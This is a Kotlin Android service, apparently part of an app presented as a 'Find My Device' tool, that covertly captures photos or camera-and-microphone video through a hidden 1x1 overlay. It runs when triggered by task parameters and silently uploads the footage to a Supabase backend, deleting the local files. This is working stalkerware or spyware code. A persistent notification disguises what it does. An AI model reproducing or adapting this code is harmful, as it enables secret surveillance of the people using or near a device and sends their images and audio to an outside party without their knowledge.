package com.save.me

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.*
import android.util.Log
import android.view.*
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream

class HiddenOverlayMediaService : Service() {
    private val SERVICE_ID = 3333
    private val CHANNEL_ID = NotificationUtils.CHANNEL_ID

    private var windowManager: WindowManager? = null
    private var overlayView: SurfaceView? = null
    private var surface: Surface? = null
    private var serviceScope: CoroutineScope? = null

    // Task params
    private var taskAction: String? = null
    private var taskCamera: String = "rear"
    private var taskFlash: String = "off"
    private var taskQuality: String = "medium"
    private var taskDuration: Int = 60

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null

    override fun onCreate() {
        super.onCreate()
        NotificationUtils.createNotificationChannel(this)
        val launcherIconRes = applicationInfo.icon
        startForeground(
            SERVICE_ID,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Find My Device")
                .setContentText("Running in background")
                .setSmallIcon(launcherIconRes)
                .setOngoing(true)
                .build()
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        taskAction = intent?.getStringExtra("action")
        taskCamera = intent?.getStringExtra("camera") ?: "rear"
        taskFlash = intent?.getStringExtra("flash") ?: "off"
        taskQuality = intent?.getStringExtra("quality") ?: "medium"
        taskDuration = intent?.getIntExtra("duration", 60) ?: 60

        serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
        serviceScope?.launch {
            setupOverlayAndRunTask()
            stopSelf()
        }
        return START_NOT_STICKY
    }

    private suspend fun setupOverlayAndRunTask() {
        suspendCancellableCoroutine<Unit> { cont ->
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            overlayView = SurfaceView(this)
            overlayView?.holder?.setFormat(PixelFormat.TRANSLUCENT)
            overlayView?.setZOrderOnTop(true)
            overlayView?.holder?.addCallback(object : SurfaceHolder.Callback {
                override fun surfaceCreated(holder: SurfaceHolder) {
                    surface = holder.surface
                    serviceScope?.launch {
                        runTaskOnce()
                        cont.resume(Unit) {}
                    }
                }
                override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
                override fun surfaceDestroyed(holder: SurfaceHolder) {}
            })
            val params = WindowManager.LayoutParams(
                1, 1,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.START
            params.x = 0
            params.y = 0
            windowManager?.addView(overlayView, params)
        }
    }

    private suspend fun runTaskOnce() {
        when (taskAction) {
            "photo" -> capturePhoto()
            "video" -> recordVideo(taskDuration)
        }
    }

    private suspend fun capturePhoto() = withContext(Dispatchers.Main) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val characteristics = cameraManager.getCameraCharacteristics(id)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (taskCamera == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
        } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return@withContext
        }
        val outputFile = File(getExternalFilesDir(null), "overlay_photo_${System.currentTimeMillis()}.jpg")
        val imageReader = android.media.ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
        val photoTaken = CompletableDeferred<Unit>()
        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            FileOutputStream(outputFile).use { it.write(bytes) }
            image.close()
            serviceScope?.launch(Dispatchers.IO) {
                SupabaseUtils.uploadFileAndRecord(this@HiddenOverlayMediaService, outputFile, "photos/$taskCamera/${outputFile.name}", "photo")
                outputFile.delete()
            }
            closeCamera()
            photoTaken.complete(Unit)
        }, Handler(Looper.getMainLooper()))

        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) {
                cameraDevice = device
                try {
                    device.createCaptureSession(
                        listOfNotNull(surface, imageReader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                    addTarget(imageReader.surface)
                                    surface?.let { addTarget(it) }
                                    if (taskFlash == "on") {
                                        set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE)
                                    }
                                }
                                session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                photoTaken.complete(Unit)
                            }
                        },
                        Handler(Looper.getMainLooper())
                    )
                } catch (e: Exception) {
                    photoTaken.complete(Unit)
                }
            }
            override fun onDisconnected(device: CameraDevice) { closeCamera(); photoTaken.complete(Unit) }
            override fun onError(device: CameraDevice, error: Int) { closeCamera(); photoTaken.complete(Unit) }
        }, Handler(Looper.getMainLooper()))
        photoTaken.await()
    }

    private suspend fun recordVideo(durationSeconds: Int) = withContext(Dispatchers.Main) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val characteristics = cameraManager.getCameraCharacteristics(id)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (taskCamera == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
        } ?: cameraManager.cameraIdList.firstOrNull() ?: return@withContext

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return@withContext
        }
        val outputFile = File(getExternalFilesDir(null), "overlay_video_${System.currentTimeMillis()}.mp4")
        val mediaRecorder = MediaRecorder()
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mediaRecorder.setOutputFile(outputFile.absolutePath)
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024)
        mediaRecorder.setVideoFrameRate(30)
        mediaRecorder.setVideoSize(1280, 720)
        mediaRecorder.prepare()

        val videoDone = CompletableDeferred<Unit>()
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) {
                cameraDevice = device
                try {
                    device.createCaptureSession(
                        listOfNotNull(surface, mediaRecorder.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                    addTarget(mediaRecorder.surface)
                                    surface?.let { addTarget(it) }
                                }
                                session.setRepeatingRequest(captureRequest.build(), null, Handler(Looper.getMainLooper()))
                                mediaRecorder.start()
                                serviceScope?.launch {
                                    delay(durationSeconds * 1000L)
                                    try { mediaRecorder.stop() } catch (_: Exception) {}
                                    mediaRecorder.release()
                                    withContext(Dispatchers.IO) {
                                        SupabaseUtils.uploadFileAndRecord(this@HiddenOverlayMediaService, outputFile, "videos/$taskCamera/${outputFile.name}", "video")
                                        outputFile.delete()
                                    }
                                    closeCamera()
                                    videoDone.complete(Unit)
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                mediaRecorder.release()
                                closeCamera()
                                videoDone.complete(Unit)
                            }
                        },
                        Handler(Looper.getMainLooper())
                    )
                } catch (e: Exception) {
                    mediaRecorder.release()
                    videoDone.complete(Unit)
                }
            }
            override fun onDisconnected(device: CameraDevice) { mediaRecorder.release(); closeCamera(); videoDone.complete(Unit) }
            override fun onError(device: CameraDevice, error: Int) { mediaRecorder.release(); closeCamera(); videoDone.complete(Unit) }
        }, Handler(Looper.getMainLooper()))
        videoDone.await()
    }

    private fun closeCamera() {
        try { captureSession?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        captureSession = null
        cameraDevice = null
    }

    override fun onDestroy() {
        try { if (overlayView != null) windowManager?.removeViewImmediate(overlayView) } catch (_: Exception) {}
        closeCamera()
        serviceScope?.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}